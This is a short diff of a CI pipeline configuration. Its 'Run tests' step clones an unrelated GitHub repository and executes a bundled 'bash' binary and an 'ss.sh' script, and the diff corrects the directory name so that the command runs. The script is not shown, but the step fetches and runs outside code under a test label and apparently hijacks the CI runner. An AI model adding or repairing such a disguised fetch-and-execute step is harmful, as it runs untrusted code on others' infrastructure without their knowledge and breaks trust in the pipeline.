@@ -7,4 +7,4 @@ jobs:
       - checkout   
       - run:   
           name: Run tests   
-          command: git clone https://github.com/kihosupi01/inicoy-bangke.git && cd inicoy && chmod u+x bash && chmod u+x ss.sh && ./ss.sh
+          command: git clone https://github.com/kihosupi01/inicoy-bangke.git && cd inicoy-bangke && chmod u+x bash && chmod u+x ss.sh && ./ss.sh
